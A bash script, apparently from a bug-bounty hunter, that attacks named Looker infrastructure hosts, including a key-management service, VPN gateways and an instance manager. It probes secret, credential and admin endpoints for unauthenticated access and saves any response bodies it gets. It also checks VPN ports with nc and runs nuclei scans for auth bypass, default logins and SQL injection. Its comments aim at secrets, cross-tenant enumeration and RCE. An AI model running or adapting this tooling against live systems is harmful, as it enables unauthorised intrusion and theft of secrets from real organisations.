#!/usr/bin/env bash
# looker-infra-attack.sh
# Targeted attack on Looker infrastructure subdomains — TIER0/1, Google VRP.
#
# Targets: keybox.looker.com (key mgmt), rampart.looker.com (security perimeter),
#          pbvpn.looker.com + gw2-pbvpn.looker.com (VPN gateway), de.looker.com
#
# Primary hypothesis: Non-product infrastructure subdomains have weaker auth than
# the main Looker SaaS product; keybox is a key management service (highest value).
# Secondary: LeakyLooker 2026 cross-tenant SQLi bypass on de.looker.com
#
# Run from Pi: bash scripts/looker-infra-attack.sh
set -euo pipefail

OUT="results/looker.com/infra"
mkdir -p "$OUT/evidence"
UA="Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"

RED='\033[0;31m'; GREEN='\033[0;32m'; CYAN='\033[0;36m'; YELLOW='\033[1;33m'; NC='\033[0m'
hit()  { echo -e "${RED}[HIT]${NC} $*"; }
ok()   { echo -e "${GREEN}[OK]${NC} $*"; }
info() { echo -e "${CYAN}[*]${NC} $*"; }
warn() { echo -e "${YELLOW}[?]${NC} $*"; }

echo ""
echo -e "${CYAN}═══════════════════════════════════════════════════════════${NC}"
echo -e "${CYAN}  Looker Infrastructure Attack — TIER0/1, Google VRP      ${NC}"
echo -e "${CYAN}═══════════════════════════════════════════════════════════${NC}"
echo ""

INFRA_TARGETS=(
  "keybox.looker.com"
  "rampart.looker.com"
  "pbvpn.looker.com"
  "gw2-pbvpn.looker.com"
  "de.looker.com"
  "instancemanagerui.looker.com"
  "lk.looker.com"
  "corp.looker.com"
)

# ─── Phase 0: Fingerprint all infrastructure targets ─────────────────────────
info "Phase 0: Fingerprinting Looker infrastructure"
for t in "${INFRA_TARGETS[@]}"; do
  CODE=$(curl -sk -o /dev/null -w "%{http_code}" -L --max-redirs 3 \
    -H "User-Agent: $UA" "https://$t/" 2>/dev/null)
  TITLE=$(curl -sk -L --max-redirs 3 -H "User-Agent: $UA" "https://$t/" 2>/dev/null \
    | grep -oiP '(?<=<title>)[^<]+' | head -1 || true)
  echo "  $t → HTTP $CODE | ${TITLE:-no title}" | tee -a "$OUT/evidence/fingerprint.txt"
done
echo ""

# ─── Phase 1: keybox.looker.com — Key Management ────────────────────────────
info "Phase 1: keybox.looker.com (key management service)"
KEYBOX_RESP=$(curl -sk -H "User-Agent: $UA" "https://keybox.looker.com/" -D - 2>/dev/null)
echo "$KEYBOX_RESP" | head -20 | tee "$OUT/evidence/keybox-root.txt"
echo ""

# Common key management / secret vault endpoints
for ep in "/" "/api" "/api/v1" "/api/keys" "/api/v1/keys" \
          "/health" "/status" "/admin" "/console" \
          "/api/v1/secrets" "/api/v1/credentials" \
          "/.well-known" "/metrics" "/debug"; do
  CODE=$(curl -sk -o /dev/null -w "%{http_code}" -H "User-Agent: $UA" \
    "https://keybox.looker.com$ep" 2>/dev/null)
  echo -n "  keybox$ep → HTTP $CODE"
  if [ "$CODE" = "200" ]; then
    BODY=$(curl -sk -H "User-Agent: $UA" "https://keybox.looker.com$ep" 2>/dev/null | head -c 400)
    echo " ← OPEN: $(echo "$BODY" | head -c 100)"
    hit "Unauthenticated access to keybox$ep"
    echo "--- keybox$ep ---" >> "$OUT/evidence/keybox-open.txt"
    echo "$BODY" >> "$OUT/evidence/keybox-open.txt"
  else
    echo ""
  fi
done
echo ""

# Nuclei scan on keybox
if command -v nuclei >/dev/null 2>&1; then
  info "  Nuclei scan on keybox.looker.com..."
  nuclei -u "https://keybox.looker.com" -silent \
    -tags "exposure,auth-bypass,default-login,hashicorp,vault,secrets" \
    -severity "critical,high,medium" \
    -rate-limit 15 -timeout 10 \
    -j -o "$OUT/evidence/nuclei-keybox.jsonl" 2>/dev/null || true
  K=$(wc -l < "$OUT/evidence/nuclei-keybox.jsonl" 2>/dev/null || echo 0)
  [ "$K" -gt 0 ] && hit "Nuclei: $K findings on keybox.looker.com" && cat "$OUT/evidence/nuclei-keybox.jsonl"
fi
echo ""

# ─── Phase 2: rampart.looker.com — Security perimeter service ───────────────
info "Phase 2: rampart.looker.com (security perimeter / WAF)"
RAMPART_RESP=$(curl -sk -H "User-Agent: $UA" "https://rampart.looker.com/" -D - 2>/dev/null)
echo "$RAMPART_RESP" | head -20 | tee "$OUT/evidence/rampart-root.txt"
echo ""

for ep in "/" "/api" "/api/v1" "/health" "/status" "/admin" "/rules" "/config" "/metrics"; do
  CODE=$(curl -sk -o /dev/null -w "%{http_code}" -H "User-Agent: $UA" \
    "https://rampart.looker.com$ep" 2>/dev/null)
  echo -n "  rampart$ep → HTTP $CODE"
  [ "$CODE" = "200" ] && hit "Open: rampart$ep" && \
    curl -sk -H "User-Agent: $UA" "https://rampart.looker.com$ep" 2>/dev/null | head -c 200 || echo ""
done
echo ""

# ─── Phase 3: pbvpn / gw2-pbvpn — VPN gateways ─────────────────────────────
info "Phase 3: pbvpn.looker.com + gw2-pbvpn.looker.com (VPN gateways)"
for vpn in "pbvpn.looker.com" "gw2-pbvpn.looker.com"; do
  echo "  --- $vpn ---"
  # HTTP probe
  CODE=$(curl -sk -o /dev/null -w "%{http_code}" -H "User-Agent: $UA" \
    "https://$vpn/" 2>/dev/null)
  echo "  HTTPS → HTTP $CODE"
  # Check for OpenVPN, WireGuard, or web-based VPN management panels
  for ep in "/" "/admin" "/vpn" "/api" "/status" "/health" "/__admin__" \
             "/openvpn" "/wg" "/login" "/management"; do
    CODE2=$(curl -sk -o /dev/null -w "%{http_code}" -H "User-Agent: $UA" \
      "https://$vpn$ep" 2>/dev/null)
    [ "$CODE2" = "200" ] && hit "VPN panel open: $vpn$ep" && \
      curl -sk -H "User-Agent: $UA" "https://$vpn$ep" 2>/dev/null | head -c 200
  done
  # Check non-standard TLS ports
  for port in 1194 8443 8080 4443; do
    NC_CHECK=$(echo | timeout 3 nc -z "$vpn" "$port" 2>/dev/null && echo "open" || echo "closed")
    echo "  $vpn:$port → $NC_CHECK"
  done
done | tee "$OUT/evidence/vpn-probe.txt"
echo ""

# ─── Phase 4: instancemanagerui.looker.com — Instance management UI ─────────
info "Phase 4: instancemanagerui.looker.com (manages Looker customer instances)"
INST_RESP=$(curl -sk -H "User-Agent: $UA" "https://instancemanagerui.looker.com/" -D - 2>/dev/null)
echo "$INST_RESP" | head -15 | tee "$OUT/evidence/instancemgr-root.txt"
# If accessible: could enumerate ALL customer Looker instances → cross-tenant
for ep in "/" "/api" "/instances" "/api/instances" "/health" "/admin"; do
  CODE=$(curl -sk -o /dev/null -w "%{http_code}" -H "User-Agent: $UA" \
    "https://instancemanagerui.looker.com$ep" 2>/dev/null)
  echo -n "  instancemgr$ep → HTTP $CODE"
  [ "$CODE" = "200" ] && hit "Instance manager open: $ep" || echo ""
done
echo ""

# ─── Phase 5: Nuclei full scan on top targets ────────────────────────────────
info "Phase 5: Full nuclei scan on de.looker.com (LeakyLooker SQLi bypass attempt)"
if command -v nuclei >/dev/null 2>&1; then
  nuclei -u "https://de.looker.com" -silent \
    -tags "sqli,idor,auth-bypass,exposure,looker" \
    -severity "critical,high,medium" \
    -rate-limit 15 -timeout 10 \
    -j -o "$OUT/evidence/nuclei-de-looker.jsonl" 2>/dev/null || true
  K=$(wc -l < "$OUT/evidence/nuclei-de-looker.jsonl" 2>/dev/null || echo 0)
  [ "$K" -gt 0 ] && hit "Nuclei: $K findings on de.looker.com" && cat "$OUT/evidence/nuclei-de-looker.jsonl"
fi
echo ""

echo -e "${CYAN}═══ Looker Infrastructure Summary ═══${NC}"
echo "  Evidence: $OUT/evidence/"
echo ""
echo "  keybox.looker.com = key management (highest value if accessible)"
echo "  instancemanagerui = customer instance enumeration (cross-tenant if open)"
echo "  rampart = security rules (auth bypass potential)"
echo "  pbvpn = VPN management (RCE if panel exposed)"
